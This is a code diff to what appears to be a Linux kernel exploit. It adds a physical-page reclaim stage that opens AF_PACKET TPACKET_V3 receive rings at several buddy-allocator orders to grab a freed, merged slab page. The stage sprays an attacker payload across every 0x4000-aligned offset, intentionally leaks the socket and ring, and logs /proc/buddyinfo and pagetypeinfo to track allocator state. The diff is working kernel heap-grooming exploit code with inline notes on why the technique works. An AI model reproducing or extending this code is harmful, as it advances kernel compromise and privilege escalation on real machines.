@@ -1,6 +1,9 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <arpa/inet.h>
 
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
@@ -757,6 +760,90 @@ int clone_memfd(void) {
   int fd = open_memfd(child);
   kill_child(child);
   return fd;
+}
+
+/*
+ * PACKET_RING multi-order reclaim: AF_PACKET TPACKET_V3 RX ring blocks are
+ * allocated with __get_free_pages(GFP_KERNEL|__GFP_COMP|__GFP_ZERO, order)
+ * straight from the buddy LIFO. The freed mm slab page (order-2) MERGES
+ * with its freed neighbours into higher-order blocks (QEMU: free_list[2]
+ * has 443 stale blocks, so order-2 allocs never split our merged block).
+ * Counter: allocate rings at orders 2,3,4,5 — whichever free_list holds
+ * the merged block containing base, the matching ring claims it near-
+ * first (LIFO freshest) — and stamp the copy-A payload at EVERY
+ * 0x4000-aligned offset inside each block so base's position within the
+ * merged block does not matter. fd+ring intentionally leaked.
+ */
+static int packet_ring_order(unsigned order, unsigned blocks,
+                             unsigned char *payload, size_t plen) {
+  int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+  if (fd < 0) {
+    pr_info("PACKET_RING o%u: socket errno=%d\n", order, errno);
+    return 0;
+  }
+  int ver = TPACKET_V3;
+  unsigned bs = 0x1000u << order;
+  struct tpacket_req3 req;
+  memset(&req, 0, sizeof(req));
+  req.tp_block_size = bs;
+  req.tp_frame_size = 0x1000;
+  req.tp_block_nr = blocks;
+  req.tp_frame_nr = blocks << order;
+  req.tp_retire_blk_tov = 100;
+  if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &ver, sizeof(ver)) != 0 ||
+      setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) != 0) {
+    pr_info("PACKET_RING o%u: setsockopt errno=%d\n", order, errno);
+    close(fd);
+    return 0;
+  }
+  size_t ringlen = (size_t)bs * blocks;
+  unsigned char *ring =
+      mmap(NULL, ringlen, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (ring == MAP_FAILED) {
+    pr_info("PACKET_RING o%u: mmap errno=%d\n", order, errno);
+    close(fd);
+    return 0;
+  }
+  unsigned stamped = 0;
+  for (unsigned b = 0; b < blocks; b++) {
+    unsigned char *blk = ring + (size_t)b * bs;
+    for (unsigned off = 0; off + plen <= bs; off += 0x4000) {
+      memcpy(blk + off, payload, plen);
+      stamped++;
+    }
+  }
+  pr_success("PACKET_RING o%u: %u blocks x %#x claimed, %u stamps\n",
+             order, blocks, bs, stamped);
+  return 1;
+}
+
+static int packet_ring_reclaim(unsigned char *payload, size_t plen) {
+  if (!env_flag("PACKET_RING", 1))
+    return 0;
+  char b0[512] = {0};
+  read_first_line("/proc/buddyinfo", b0, sizeof(b0));
+  pr_info("BUDDY before rings: %.400s", b0);
+  int ok = 0;
+  static const unsigned orders[] = {2, 3, 4, 5};
+  unsigned defblocks = (unsigned)env_int_range("PACKET_BLOCKS", 16, 1, 512);
+  for (size_t i = 0; i < sizeof(orders) / sizeof(orders[0]); i++) {
+    ok |= packet_ring_order(orders[i], defblocks, payload, plen);
+  }
+  char b1[512] = {0};
+  read_first_line("/proc/buddyinfo", b1, sizeof(b1));
+  pr_info("BUDDY after rings: %.400s", b1);
+  {
+    FILE *pf = fopen("/proc/pagetypeinfo", "r");
+    if (pf) {
+      char l[256];
+      while (fgets(l, sizeof(l), pf)) {
+        if (strstr(l, "DMA32"))
+          pr_info("PAGETYPE %.200s", l);
+      }
+      fclose(pf);
+    }
+  }
+  return ok;
 }
 
 void prepare_ctxs(void) {
@@ -1614,6 +1701,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   slab_state_snap("after_closes");
+  packet_ring_reclaim(skb_buf, 0x500);
 
   int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
   pid_t *churn_pids = NULL;
